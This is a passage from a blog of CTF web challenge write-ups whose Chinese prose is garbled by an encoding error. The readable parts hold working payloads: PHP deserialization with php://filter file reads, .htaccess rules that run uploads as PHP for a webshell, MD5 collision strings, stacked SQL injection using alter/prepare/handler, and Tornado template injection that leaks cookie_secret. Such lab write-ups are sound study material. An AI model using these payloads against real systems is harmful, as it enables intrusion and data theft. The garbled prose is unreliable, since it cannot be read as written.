<p>æ‰€ä»¥è¯´åªè¦é¢†op=2ï¼ˆæ•´å½¢ï¼‰ï¼Œé‚£ä¹ˆä¸¤å¤„éƒ½å¯ä»¥ç»•è¿‡ï¼Œï¼ˆç¬¬ä¸€å¤„ç»•è¿‡å­—ç¬¦ï¼Œç¬¬äºŒå¦‚ç›´æ¥readï¼‰ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">read</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$res</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$res</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></div><p>filenameå¯ä»¥æ§åˆ¶ï¼Œæ¥ç€ä½¿ç”¨file_get_contentså‡½æ•°è¯»æ–‡ä»¶ï¼Œè¿™é‡Œå¯ä»¥ç”¨php://filterä¼ªåè®®è¯»æ–‡ä»¶ï¼Œç„¶åè¾“å‡ºã€‚</p>
<p>ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œ$op,$filename,$contentè¿™ä¸‰ä¸ªéƒ½æ˜¯protectedï¼Œprotectedæƒé™çš„å˜é‡åºåˆ—åŒ–çš„æ—¶å€™ä¼šæœ‰%00*%00å­—ç¬¦ï¼Œè€Œ%00çš„ASCIIç¼–ç ä¸º0ï¼Œä¸èƒ½ç»•è¿‡is_validçš„æ£€æŸ¥ã€‚</p>
<p>ç»•è¿‡çš„è¯ï¼Œphp7.1+çš„ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæœ¬åœ°åºåˆ—åŒ–çš„æ—¶å€™å¯ä»¥ä½¿ç”¨publicç»•è¿‡ã€‚</p>
<p>ï¼ˆprotected/privateç±»å‹çš„å±æ€§åºåˆ—åŒ–åäº§ç”Ÿä¸å¯æ‰“å°å­—ç¬¦ï¼Œpublicç±»å‹åˆ™ä¸ä¼šã€‚ï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileHandler</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$op</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">FileHandler</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>æ€»çš„æ¥è¯´è¿™é“é¢˜è¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ï¼Œå­¦åˆ°äº†å¾ˆå¤šã€‚</p>
<h3 id="0x1cmrctf2020ä½ ä¼ ä½ å‘¢" class="heading-element"><span>0x1C.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</span>
  <a href="#0x1cmrctf2020%e4%bd%a0%e4%bc%a0%e4%bd%a0%e5%91%a2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>ä¸Šä¼ .htaccessï¼Œæœ‰å‡ ç§å†™æ³•ï¼š</p>
<blockquote>
<p>SetHandler application/x-httpd-php</p>
</blockquote>
<pre tabindex="0"><code>&lt;FilesMatch &#34;bbb&#34;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
//å…¶ä¸­bbbæ˜¯è¦åŒ…å«çš„æ–‡ä»¶ï¼Œéƒ½ä¼šè¢«å½“åšphpæ¥æ‰§è¡Œ</code></pre><blockquote>
<pre tabindex="0"><code>AddType application/x-httpd-php .png</code></pre></blockquote>
<p>å¤§è‡´å°±ä¸Šé¢3ç§å†™æ³•å§ã€‚</p>
<p>PSï¼šå½“æ—¶ä¸€ç›´è¿ä¸ä¸Šã€‚ã€‚åŸæ¥æ˜¯htaccesså†™æˆäº†htacess</p>
<p>ç„¶åå°±ç¤¾å†™é©¬ä¸Šä¼ èšå‰‘è¿æ¥å°±okäº†ã€‚</p>
<h3 id="0x1dmrctf2020ez_bypass" class="heading-element"><span>0x1D.[MRCTF2020]Ez_bypass</span>
  <a href="#0x1dmrctf2020ez_bypass" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>ç¬¬ä¸€ä¸ªç»•è¿‡æœ‰ä¸¤ç§ç»•æ³•ï¼Œä¹‹å‰çš„ä¸€ä¸ªç»•md5çš„é¢˜ä¸­ä¹Ÿå†™äº†ï¼š</p>
<p>ç¬¬ä¸€ç§ï¼šMD5ç¢°æ’</p>
<blockquote>
<p>?gg=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;id=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>
</blockquote>
<p>æˆ–è€…</p>
<pre tabindex="0"><code>$s1 = &#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&#34;
$s2 = &#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&#34;
$s3 = &#34;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&#34;
ä»¥ä¸Š3ä¸ªçš„å­—ç¬¦ä¸²éƒ½ä¸ç›¸ç­‰ï¼Œä½†æ˜¯md5å€¼ç›¸ç­‰ã€‚</code></pre><p>ç¬¬äºŒç§ï¼Œæ•°ç»„ç»•è¿‡ï¼š</p>
<blockquote>
<p>?gg[]=1&amp;id[]=1</p>
</blockquote>
<p>ç¬¬äºŒä¸ªç»•è¿‡å°±æ˜¯ç®€å•çš„åœ¨åé¢åŠ å­—ç¬¦å°±OK</p>
<blockquote>
<p>passwd=1234567a</p>
</blockquote>
<h3 id="0x1egyctf2020blacklist" class="heading-element"><span>0x1E.[GYCTF2020]Blacklist</span>
  <a href="#0x1egyctf2020blacklist" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>æœ‰2ä¸ªå­—æ®µï¼Œä½†æ˜¯union select çˆ†å‡ºè¯´ä¸èƒ½selectï¼Œé‚£ä¹ˆå †å æŸ¥è¯¢ã€‚</p>
<p>show databases;show tables ;show columns from &lsquo;è¡¨å&rsquo;ï¼›</p>
<p>ä¸€å…±æœ‰ä¸¤ä¸ªè¡¨ï¼Œwordsï¼ŒFlagHere</p>
<p>ç»•è¿‡æŠ€å·§æœ‰3ä¸ªï¼š</p>
<p>1ï¼‰ä¿®æ”¹è¡¨å</p>
<p>å…¶ä¸­wordsï¼šshow columns from words åæ˜¯idå’Œdata</p>
<p>è€ŒFlagä¸­åªæœ‰ä¸€ä¸ªflagã€‚</p>
<p>æ¨æµ‹æ˜¯select id,data from words where id=&rsquo;$id$&rsquo;</p>
<p>é‚£ä¹ˆï¼š</p>
<pre tabindex="0"><code>1.å°†wordsè¡¨åæ¢æˆå…¶ä»–çš„åå­—
2.å°†FlagHereæ¢æˆwordsè¡¨å
3.å§flagè¿™ä¸ªå­—æ®µæ¢æˆdata
4.å†æ’å…¥ä¸€ä¸ªidå­—æ®µ</code></pre><pre tabindex="0"><code>1&#39;;
alter table words rename to words1;
alter table `FlagHere` rename to words;
alter table words change flag id varchar(50);#

ç„¶å 1&#39; or 1=1# å°†flagæ‰“å°å‡ºæ¥</code></pre><p>2ï¼‰é¢„ç¼–è¯‘</p>
<pre tabindex="0"><code>PREPARE name from &#39;[my sql sequece]&#39;;   //é¢„å®šä¹‰SQLè¯­å¥
EXECUTE name;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥
(DEALLOCATE || DROP) PREPARE name;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥</code></pre><pre tabindex="0"><code>SET @tn = &#39;hahaha&#39;;  //å­˜å‚¨è¡¨å
SET @sql = concat(&#39;select * from &#39;, @tn);  //å­˜å‚¨SQLè¯­å¥
PREPARE name from @sql;   //é¢„å®šä¹‰SQLè¯­å¥
EXECUTE name;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥
(DEALLOCATE || DROP) PREPARE sqla;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥</code></pre><p>æ¯”å¦‚ï¼š</p>
<pre tabindex="0"><code>1&#39;;
SeT@a=â€™select * from `FlagHereâ€˜;
prepare execsql from @a;
execute execsql;#
##å¯ä»¥ä½¿ç”¨16è¿›åˆ¶ç»•è¿‡</code></pre><p>3ï¼‰Handler</p>
<p>ä½†æ˜¯ä»¥ä¸Šæ–¹æ³•åœ¨è¿™é¢˜å¤±æ•ˆï¼Œå› ä¸ºï¼š</p>
<blockquote>
<pre tabindex="0"><code>return preg_match(&#34;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&#34;,$inject);</code></pre></blockquote>
<p>å¯ä»¥ä½¿ç”¨handleræŸ¥çœ‹ï¼š</p>
<blockquote>
<p>1&rsquo;;</p>
<p>handler FlagHere open;</p>
<p>handler FlagHere read first;#</p>
</blockquote>
<h3 id="0x1fæŠ¤ç½‘æ¯-2018easy_tornado" class="heading-element"><span>0x1F.[æŠ¤ç½‘æ¯ 2018]easy_tornado</span>
  <a href="#0x1f%e6%8a%a4%e7%bd%91%e6%9d%af-2018easy_tornado" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>ä¸‰ä¸ªæ–‡ä»¶ï¼š</p>
<pre tabindex="0"><code>/flag.txt
/welcome.txt
/hints.txt</code></pre><pre tabindex="0"><code>/flag.txt
flag in /fllllllllllllag

/welcome.txt
render

/hints.txt
md5(cookie_secret+md5(filename))</code></pre><p>åœ¨hintså¯ä»¥çœ‹åˆ°:</p>
<blockquote>
<p>file?filename=/hints.txt&amp;filehash=3c2c74f529451b2c58f5624ce640dfd5</p>
<p>è¯´æ˜è¿˜éœ€è¦filehash</p>
</blockquote>
<blockquote>
<p>renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µ renderé…åˆTornadoä½¿ç”¨</p>
<p>æ ¹æ®ä¹‹å‰æ‰“å¼€æ–‡ä»¶çš„urlå‚æ•°åˆ†æè¿™ä¸ªå°±æ˜¯filehashçš„å€¼ æƒ³è·å¾—flagåªè¦æˆ‘ä»¬åœ¨urlä¸­ä¼ å…¥/fllllllllllllagæ–‡ä»¶å’Œfilehash ç»è¿‡è¿™æ®µä»£ç å¤„ç†çš„å€¼å³å¯å…³é”®å°±åœ¨è¿™cookie_secretè¿™å—,å¾—æƒ³åŠæ³•è·å¾—cookie_secret</p>
<p>åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡,è¿™é‡Œç”¨åˆ°çš„æ˜¯handler.settingsï¼Œhandler æŒ‡å‘RequestHandlerï¼Œè€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settingsï¼Œæ‰€ä»¥handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼Œè¿™é‡Œé¢å°±æ˜¯æˆ‘ä»¬çš„ä¸€äº›ç¯å¢ƒå˜é‡</p>
<p>é€šè¿‡æ¨¡æ¿æ³¨å…¥æ–¹å¼æˆ‘ä»¬å¯ä»¥æ„é€ </p>
</blockquote>
<pre tabindex="0"><code>error?msg={{handler.settings}}</code></pre><p>å¾—åˆ°:ab4a6b4a-f87f-449d-9016-1cd76c91c474</p>
<p>ç„¶åé€šè¿‡è„šæœ¬è·å–hash</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="n">cookie_secret</span> <span class="o">=</span> <span class="s1">&#39;ab4a6b4a-f87f-449d-9016-1cd76c91c474&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">filename</span> <span class="o">=</span> <span class="s1">&#39;/fllllllllllllag&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">file_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">new_filename</span> <span class="o">=</span> <span class="n">cookie_secret</span> <span class="o">+</span> <span class="n">file_hash</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">new_filename</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span></span></span></code></pre></div><blockquote>
<p>file?filename=/fllllllllllllag&amp;filehash=add6c325a3930e0b3a30602d131fa9ea</p>
</blockquote>
<p>å¾—åˆ°flag</p>
</div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="æ›´æ–°äº 2021-05-03 00:00:00">æ›´æ–°äº 2021-05-03&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="åˆ†äº«åˆ° X" data-sharer="twitter" data-url="http://ghostasky.github.io/posts/buu-web-0x10-0x1f/" data-title="BUU_WEBåˆ·é¢˜_0x10-0x1F" data-hashtags="WEB"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="åˆ†äº«åˆ° Facebook" data-sharer="facebook" data-url="http://ghostasky.github.io/posts/buu-web-0x10-0x1f/" data-hashtag="WEB"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="åˆ†äº«åˆ° å¾®åš" data-sharer="weibo" data-url="http://ghostasky.github.io/posts/buu-web-0x10-0x1f/" data-title="BUU_WEBåˆ·é¢˜_0x10-0x1F"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/web/" class="post-tag" title="æ ‡ç­¾ - WEB">WEB</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">è¿”å›</a></span>&nbsp;|&nbsp;<span><a href="/">ä¸»é¡µ</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/buu-web-0x1-0xf/" class="post-nav-item" rel="prev" title="BUU_WEBåˆ·é¢˜_0x01-0x0F"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>BUU_WEBåˆ·é¢˜_0x01-0x0F</a>
      <a href="/posts/buu-pwn-0x10-0x1f/" class="post-nav-item" rel="next" title="BUU_PWNåˆ·é¢˜_0x10-0x1F">BUU_PWNåˆ·é¢˜_0x10-0x1F<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="ç›®å½•"><h2 class="toc-title">ç›®å½•&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">ç”± <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> å¼ºåŠ›é©±åŠ¨ | ä¸»é¢˜ - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.8-RC"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
              <a href="/">Ghostasky</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="å›åˆ°é¡¶éƒ¨"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">è¯¥ç½‘ç«™åœ¨å¯ç”¨ JavaScript çš„æƒ…å†µä¸‹æ•ˆæœæœ€ä½³ã€‚</div>
  </noscript>
</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"å¤åˆ¶åˆ°å‰ªè´´æ¿","editLockTitle":"é”å®šå¯ç¼–è¾‘ä»£ç å—","editUnLockTitle":"è§£é”å¯ç¼–è¾‘ä»£ç å—","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"åŒæ„","link":"äº†è§£æ›´å¤š","message":"æœ¬ç½‘ç«™ä½¿ç”¨ Cookies æ¥æ”¹å–„æ‚¨çš„æµè§ˆä½“éªŒã€‚"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"le